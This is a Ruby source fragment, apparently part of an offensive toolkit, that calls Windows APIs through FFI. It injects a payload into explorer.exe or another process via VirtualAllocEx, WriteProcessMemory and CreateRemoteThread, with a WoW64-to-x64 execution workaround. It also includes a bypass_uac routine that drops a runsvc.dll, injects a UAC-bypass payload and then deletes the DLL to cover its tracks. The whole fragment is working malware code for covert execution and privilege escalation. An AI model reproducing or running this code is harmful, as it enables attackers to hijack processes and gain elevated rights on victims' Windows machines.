def inject(pid, payload = TEST_PAYLOAD)
  pid = get_pid_by_name('explorer.exe').to_i unless pid
  h_process = Win.OpenProcess(Win::PROCESS_DUP_HANDLE | Win::PROCESS_VM_OPERATION | Win::PROCESS_VM_WRITE | 
                              Win::PROCESS_CREATE_THREAD | Win::PROCESS_QUERY_INFORMATION | Win::PROCESS_VM_READ, 
                              false, pid)
  return "OpenProcess failed" unless h_process
  
  lp_remote_buffer = Win.VirtualAllocEx(h_process, nil, payload.length, Win::MEM_RESERVE | Win::MEM_COMMIT,
                                          Win::PAGE_EXECUTE_READWRITE)
  return "VirtualAlloc failed" unless lp_remote_buffer
  
  lp_payload = FFI::MemoryPointer.from_string(payload)
  unless Win.WriteProcessMemory(h_process, lp_remote_buffer, lp_payload, payload.length, nil)
    return "WriteProcessMemory failed"
  end
  
  lp_thread_id = FFI::MemoryPointer.new :uint, 1, true
  h_thread = Win.CreateRemoteThread(h_process, nil, 1024*1024, lp_remote_buffer, nil,
                                      Win::CREATE_SUSPENDED, lp_thread_id)
  if h_thread == 0
    if ENV['PROCESSOR_ARCHTECTURE'] =~ /amd64/i || ENV['PROCESSOR_ARCHITEW6432'] =~ /amd64/i
      h_thread = exec_x64(h_process, lp_remote_buffer)
      return "exec_x64 failed" if h_thread == 0
    else
      return "CreateRemoteThread failed"
    end
  end
  
  return "ResumeThread failed" if Win.ResumeThread(h_thread) == -1
  
  Win.CloseHandle(h_thread)
  Win.CloseHandle(h_process)
  return "Success"
  
rescue Exception => e
  puts e.message
  puts e.backtrace.inspect
  return "Failed: Exception"
end

def exec_x64(h_process, pcode)
  pexec_x64 = Win.VirtualAlloc(nil, MIGRATE_EXECX64.length, Win::MEM_RESERVE | Win::MEM_COMMIT, Win::PAGE_EXECUTE_READWRITE)
  px64_func = Win.VirtualAlloc(nil, MIGRATE_WOWNATIVEX.length + Win::Wow64Context.size, 
                                  Win::MEM_RESERVE | Win::MEM_COMMIT, Win::PAGE_EXECUTE_READWRITE)
  
  pexec_x64.write_string(MIGRATE_EXECX64)
  px64_func.write_string(MIGRATE_WOWNATIVEX)
  
  pctx      = px64_func[MIGRATE_WOWNATIVEX.length]
  ctx       = Win::Wow64Context.new(pctx)
  
  ctx[:hProcess] = h_process
  ctx[:lpStartAddress] = pcode
  ctx[:hThread] = 0x00000000
  ctx[:lpParameter] = nil
  ctx[:dwPad1] = 0x0
  ctx[:dwPad2] = 0x0
  ctx[:dwPad3] = 0x0
  ctx[:dwPad4] = 0x0
    
  funcptr = FFI::Function.new( FFI.find_type(:int), [:pointer, :pointer], pexec_x64, :convention => :default )
  funcptr.call(px64_func, ctx)
  
  return ctx[:hThread]
  
rescue Exception => e
  puts e.message
  puts e.backtrace.inspect
  return 0
end

def bypass_uac
  if ENV['PROCESSOR_ARCHTECTURE'] =~ /amd64/i || ENV['PROCESSOR_ARCHITEW6432'] =~ /amd64/i
    f = File.open("runsvc.dll", 'wb')
    f.write(RUNSVC64)
    f.close
    inject(nil, UACBYPASS64) || "Failed."
  else
    f = File.open("runsvc.dll", 'wb')
    f.write(RUNSVC32)
    f.close
    inject(nil, UACBYPASS32) || "Failed."
  end
  sleep 5
  `del runsvc.dll`
rescue Exception => e
  puts e.message
  puts e.backtrace.inspect
end